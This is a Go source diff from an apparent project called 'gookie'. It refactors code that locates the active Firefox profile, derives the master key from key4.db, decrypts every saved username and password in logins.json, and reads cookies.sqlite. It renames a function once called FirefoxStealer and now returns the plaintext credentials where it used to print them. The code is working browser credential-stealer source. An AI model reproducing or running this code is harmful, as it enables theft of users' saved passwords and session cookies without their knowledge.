@@ -13,21 +13,17 @@ import (
 	"errors"
 	"fmt"
 	"golang.org/x/crypto/pbkdf2"
-	"io/ioutil"
-	"log"
+	"gookie/pkg/utils"
 	"os"
 	"path/filepath"
-	"strings"
-
-	"gookie/pkg/utils"
 )
 
-type Logins struct {
-	NextId                           int           `json:"nextId"`
-	Logins                           []Login       `json:"logins"`
-	PotentiallyVulnerablePasswords   []interface{} `json:"potentiallyVulnerablePasswords"`
-	DismissedBreachAlertsByLoginGUID interface{}   `json:"dismissedBreachAlertsByLoginGUID"`
-	Version                          int           `json:"version"`
+type LoginList struct {
+	NextId                int                    `json:"nextId"`
+	Logins                []Login                `json:"logins"`
+	VulnerablePasswords   []interface{}          `json:"potentiallyVulnerablePasswords"`
+	DismissedBreachAlerts map[string]interface{} `json:"dismissedBreachAlertsByLoginGUID"`
+	Version               int                    `json:"version"`
 }
 
 type Login struct {
@@ -47,58 +43,52 @@ type Login struct {
 	TimesUsed           int         `json:"timesUsed"`
 }
 
-type X struct {
-	Field0 asn1.ObjectIdentifier
-	Field1 []Y
+type ASN1Object struct {
+	ObjectIdentifier asn1.ObjectIdentifier
+	ObjectSequence   []ASN1Sequence
 }
 
-type Y struct {
-	Content asn1.RawContent
-	Field0  asn1.ObjectIdentifier
+type ASN1Sequence struct {
+	Content          asn1.RawContent
+	ObjectIdentifier asn1.ObjectIdentifier
 }
 
-type Y2 struct {
-	Field0 asn1.ObjectIdentifier
-	Field1 Z
+type ASN1SequenceWithEmbedded struct {
+	ObjectIdentifier asn1.ObjectIdentifier
+	EmbeddedObject   ASN1EmbeddedObject
 }
 
-type Y3 struct {
-	Field0 asn1.ObjectIdentifier
-	Field1 []byte
+type ASN1SequenceWithBytes struct {
+	ObjectIdentifier asn1.ObjectIdentifier
+	Data             []byte
 }
 
-type Z struct {
-	Field0 []byte
-	Field1 int
-	Field2 int
-	Field3 []asn1.ObjectIdentifier
+type ASN1EmbeddedObject struct {
+	Data              []byte
+	Int1              int
+	Int2              int
+	ObjectIdentifiers []asn1.ObjectIdentifier
 }
 
 type EncryptedData struct {
-	Field0 []byte
-	Field1 EncryptedDataSeq
-	Field2 []byte
+	KeyIdentifier []byte
+	DataSequence  EncryptedDataSequence
+	CipherText    []byte
 }
 
-type EncryptedDataSeq struct {
-	Field0 asn1.ObjectIdentifier
-	Field1 []byte
+type EncryptedDataSequence struct {
+	ObjectIdentifier asn1.ObjectIdentifier
+	Data             []byte
 }
 
-type Key struct {
-	Field0 X
-	Field1 []byte
+type KeyData struct {
+	ASN1ObjectData ASN1Object
+	Data           []byte
 }
 
-type Credential struct {
-	Hostname string
-	Username string
-	Password string
-}
-
-func loadLoginsData(profilePath string) (Logins, error) {
-	var logins Logins
-	jsonData, err := ioutil.ReadFile(filepath.Join(profilePath, "logins.json"))
+func loadLoginsData(profilePath string) (LoginList, error) {
+	var logins LoginList
+	jsonData, err := os.ReadFile(filepath.Join(profilePath, "logins.json"))
 	if err != nil {
 		return logins, fmt.Errorf("failed to read file: %w", err)
 	}
@@ -123,7 +113,7 @@ func decryptAES(ciphertext, key, iv []byte) ([]byte, error) {
 	return plaintext, nil
 }
 
-func unpad(data []byte, blockSize int) []byte {
+func unpad(data []byte) []byte {
 	padding := int(data[len(data)-1])
 	return data[:len(data)-padding]
 }
@@ -138,7 +128,7 @@ func decryptTripleDES(key []byte, iv []byte, ciphertext []byte) ([]byte, error) 
 	mode := cipher.NewCBCDecrypter(block, iv)
 	mode.CryptBlocks(plaintext, ciphertext)
 
-	return unpad(plaintext, 8), nil
+	return unpad(plaintext), nil
 }
 
 func decodeLoginData(data string) ([]byte, []byte, []byte, error) {
@@ -152,10 +142,10 @@ func decodeLoginData(data string) ([]byte, []byte, []byte, error) {
 		return nil, nil, nil, fmt.Errorf("failed to unmarshal ASN.1 data: %w", err)
 	}
 
-	return x.Field0, x.Field1.Field1, x.Field2, nil
+	return x.KeyIdentifier, x.DataSequence.Data, x.CipherText, nil
 }
 
-func FirefoxCrackLoginData(profilePath string) ([]Credential, error) {
+func FirefoxCrackLoginData(profilePath string) ([]Password, error) {
 	key4Path := filepath.Join(profilePath, "key4.db")
 
 	if _, err := os.Stat(key4Path); err != nil {
@@ -169,9 +159,9 @@ func FirefoxCrackLoginData(profilePath string) ([]Credential, error) {
 	defer db.Close()
 
 	var globalSalt, item2 []byte
-	var key Key
-	var key2 Y2
-	var key3 Y3
+	var key KeyData
+	var key2 ASN1SequenceWithEmbedded
+	var key3 ASN1SequenceWithBytes
 
 	row := db.QueryRow("SELECT item1, item2 FROM metadata WHERE id = 'password'")
 	if err := row.Scan(&globalSalt, &item2); err != nil {
@@ -188,22 +178,22 @@ func FirefoxCrackLoginData(profilePath string) ([]Credential, error) {
 		return nil, fmt.Errorf("failed to unmarshal ASN.1 data: %w", err)
 	}
 
-	if _, err := asn1.Unmarshal(key.Field0.Field1[0].Content, &key2); err != nil {
+	if _, err := asn1.Unmarshal(key.ASN1ObjectData.ObjectSequence[0].Content, &key2); err != nil {
 		return nil, fmt.Errorf("failed to unmarshal ASN.1 data: %w", err)
 	}
 
-	if _, err := asn1.Unmarshal(key.Field0.Field1[1].Content, &key3); err != nil {
+	if _, err := asn1.Unmarshal(key.ASN1ObjectData.ObjectSequence[1].Content, &key3); err != nil {
 		return nil, fmt.Errorf("failed to unmarshal ASN.1 data: %w", err)
 	}
 
-	entrySalt := key2.Field1.Field0
-	iterationCount := key2.Field1.Field1
-	keyLength := key2.Field1.Field2
+	entrySalt := key2.EmbeddedObject.Data
+	iterationCount := key2.EmbeddedObject.Int1
+	keyLength := key2.EmbeddedObject.Int2
 
 	k := sha1.Sum(globalSalt)
 	respectKey := pbkdf2.Key(k[:], entrySalt, iterationCount, keyLength, sha256.New)
-	iv := append([]byte{4, 14}, key3.Field1...)
-	cipherT := key.Field1
+	iv := append([]byte{4, 14}, key3.Data...)
+	cipherT := key.Data
 
 	res, err := decryptAES(cipherT, respectKey, iv)
 	if err != nil {
@@ -215,7 +205,7 @@ func FirefoxCrackLoginData(profilePath string) ([]Credential, error) {
 		return nil, fmt.Errorf("failed to load logins data: %w", err)
 	}
 
-	var credentials []Credential
+	var credentials []Password
 	for _, login := range logins.Logins {
 		_, y, z, err := decodeLoginData(login.EncryptedUsername)
 		if err != nil {
@@ -237,17 +227,15 @@ func FirefoxCrackLoginData(profilePath string) ([]Credential, error) {
 			return nil, fmt.Errorf("failed to decrypt Triple DES: %w", err)
 		}
 
-		credentials = append(credentials, Credential{login.Hostname, string(username), string(password)})
+		credentials = append(credentials, Password{login.Hostname, string(username), string(password), nil})
 	}
 
 	return credentials, nil
 }
 
 func getActiveProfilePath() (string, error) {
-	// Get the path of Firefox profiles folder from the APPDATA environment variable
 	path := filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
 
-	// Open the Firefox profiles folder and read its directory names
 	f, err := os.Open(path)
 	if err != nil {
 		return "", fmt.Errorf("failed to open profiles folder: %v", err)
@@ -259,7 +247,6 @@ func getActiveProfilePath() (string, error) {
 		return "", fmt.Errorf("failed to read directory names: %v", err)
 	}
 
-	// Find the directory that contains a cookies.sqlite file which indicates the active profile
 	activeDir := ""
 	for _, dir := range dirs {
 		if _, err := os.Stat(filepath.Join(path, dir, "cookies.sqlite")); err == nil {
@@ -272,41 +259,32 @@ func getActiveProfilePath() (string, error) {
 		return "", errors.New("no active profile found")
 	}
 
-	// Construct the path of the active profile directory
 	path = filepath.Join(path, activeDir)
 
 	return path, nil
 }
 
-func FirefoxStealer() {
+func ReadFirefoxPasswords() ([]Password, error) {
 	profilePath, err := getActiveProfilePath()
 	if err != nil {
-		log.Fatal(err)
-		os.Exit(1)
+		return nil, err
 	}
 
-	creds, err := FirefoxCrackLoginData(profilePath)
+	credentials, err := FirefoxCrackLoginData(profilePath)
 	if err != nil {
-		log.Fatal(err)
-	}
-	for _, cred := range creds {
-		fmt.Printf("Site: %s \nUsername: %s\nPassword: %s\n\n", cred.Hostname, cred.Username, cred.Password)
+		return nil, err
 	}
 
+	return credentials, nil
 }
 
 func ReadFirefoxCookies() ([]Cookie, error) {
-	profile, err := getDefaultFirefoxProfile()
+	profilePath, err := getActiveProfilePath()
 	if err != nil {
 		return nil, err
 	}
 
-	osUser, err := utils.GetCurrentUsername()
-	if err != nil {
-		return nil, err
-	}
-
-	cookiesPath := filepath.Join("C:\\Users", osUser, "AppData\\Roaming\\Mozilla\\Firefox\\Profiles", profile, "cookies.sqlite")
+	cookiesPath := filepath.Join(profilePath, "cookies.sqlite")
 
 	dbConn, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?cache=shared&mode=ro", cookiesPath))
 	if err != nil {
@@ -342,38 +320,4 @@ func ReadFirefoxCookies() ([]Cookie, error) {
 		cookies = append(cookies, cookie)
 	}
 	return cookies, nil
-}
-
-func getDefaultFirefoxProfile() (string, error) {
-	osUser, err := utils.GetCurrentUsername()
-	if err != nil {
-		return "", err
-	}
-
-	profilesDir := filepath.Join("C:\\Users", osUser, "AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
-	profileFiles, err := os.ReadDir(profilesDir)
-	if err != nil {
-		return "", err
-	}
-
-	for _, profile := range profileFiles {
-		if !profile.IsDir() || !strings.Contains(profile.Name(), ".default") {
-			continue
-		}
-
-		currentProfile, err := os.ReadDir(filepath.Join(profilesDir, profile.Name()))
-		if err != nil {
-			return "", err
-		}
-
-		for _, file := range currentProfile {
-			if file.Name() != "cookies.sqlite" {
-				continue
-			}
-
-			return profile.Name(), nil
-		}
-	}
-
-	return "", errors.New("could not find default profile")
 }
